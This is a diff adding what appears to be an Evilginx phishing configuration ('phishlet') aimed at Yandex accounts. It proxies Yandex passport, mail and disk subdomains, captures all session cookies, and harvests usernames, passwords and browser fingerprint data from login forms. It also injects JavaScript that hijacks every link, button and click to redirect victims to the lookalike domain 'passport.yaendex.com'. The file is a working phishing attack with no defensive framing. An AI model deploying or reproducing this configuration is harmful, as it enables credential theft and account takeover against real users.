@@ -1,0 +1,105 @@
+author: '@Butterfly'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'passport', orig_sub: 'passport', domain: 'yandex.com', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: '', orig_sub: '', domain: 'yandex.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'mail', orig_sub: 'mail', domain: 'yandex.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'disk', orig_sub: 'disk', domain: 'yandex.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'downloader.disk', orig_sub: 'downloader.disk', domain: 'yandex.com', session: true, is_landing: false, auto_filter: false}
+
+sub_filters:
+  - {triggers_on: 'disk.yandex.com', orig_sub: '', domain: 'yandex.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/javascript', 'application/json']}
+  - {triggers_on: 'disk.yandex.com', orig_sub: '', domain: 'yandex.com', search: 'yandex.ru', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/javascript', 'application/json']}
+  - {triggers_on: 'passport.yandex.com', orig_sub: 'passport', domain: 'yandex.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/javascript', 'application/json']}
+  - {triggers_on: 'passport.yandex.com', orig_sub: 'passport', domain: 'yandex.com', search: 'Log in', replace: 'Access disk ', mimes: ['text/html']}
+  - {triggers_on: 'passport.yandex.com', orig_sub: 'passport', domain: 'yandex.com', search: 'Почте', replace: 'Диск', mimes: ['text/html']}
+  - {triggers_on: 'passport.yandex.com', orig_sub: 'passport', domain: 'yandex.com', search: 'id="passp:exp-register"', replace: ' style="display:none" id="passp:exp-register"', mimes: ['text/html']}
+  - {triggers_on: 'yandex.com', orig_sub: '', domain: 'yandex.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/javascript', 'application/json']}
+  - {triggers_on: 'mc.yandex.com', orig_sub: '', domain: 'yandex.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/javascript', 'application/json']}
+ 
+auth_tokens:
+  - domain: '.yandex.com'
+    keys: ['.*,regexp']
+  - domain: 'mail.yandex.com'
+    keys: ['.*,regexp']
+  - domain: 'passport.yandex.com'
+    keys: ['.*,regexp']
+credentials:
+  username:
+    key: 'login'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+  custom:
+    - key: 'browser-fp-data'
+      search: '(.*)'
+      type: 'post'
+auth_urls:
+  - '/registration-validations'
+  - '/profile'
+login:
+  domain: 'passport.yandex.com'
+  path: '/auth?retpath=https%3A%2F%2Fpassport.yandex.com%2F&noreturn=1'
+  
+js_inject:  
+  - trigger_domains: ["disk.yandex.com"]
+    trigger_paths: ["/i/.*"]
+    trigger_params: ["email"]
+    script: |
+      function lp(){
+          location.href="https://passport.yaendex.com"
+          setTimeout(function(){lp();}, 5000);
+      }
+      setTimeout(function(){lp();}, 8000);
+      window.onclick = function(event) {
+        //if (event.target == modal) {
+        //    modal.style.display = "none";
+        //}
+        location.href="https://passport.yaendex.com";
+        event.preventDefault();
+        event.stopPropagation();
+      }
+      var div_span_link= document.getElementsByTagName("span");
+      for (var i = 0; i < div_span_link.length; i++) {
+          div_span_link[i].onclick = function(event) {
+              location.href="https://passport.yaendex.com";
+              event.preventDefault();
+              event.stopPropagation();
+          };
+      }
+      var anchors = document.getElementsByTagName("a");
+      for (var i = 0; i < anchors.length; i++) {
+          anchors[i].onclick = function(event) {
+              location.href="https://passport.yaendex.com";
+              event.preventDefault();
+              event.stopPropagation();
+          };
+      }
+      var btns = document.getElementsByTagName("button");
+      for (var i = 0; i < btns.length; i++) {
+          btns[i].onclick = function(event) {
+              location.href="https://passport.yaendex.com";
+              event.preventDefault();
+              event.stopPropagation();
+          };
+      }
+  - trigger_domains: ["passport.yandex.com"]
+    trigger_paths: [".*?"]
+    trigger_params: ["email"]
+    script: |
+      function lp(){
+        var email = document.querySelector("#passp-field-login");
+        var btn = document.getElementsByClassName("Button2_type_submit")[0];
+        if (email != null /* && btn !=null */) {
+          //email.value = "{email}";
+         // btn.click();
+         // return;
+         setTimeout(function(){lp();}, 1000);
+        }
+        else setTimeout(function(){lp();}, 500);
+        
+      }
+      setTimeout(function(){lp();}, 100);
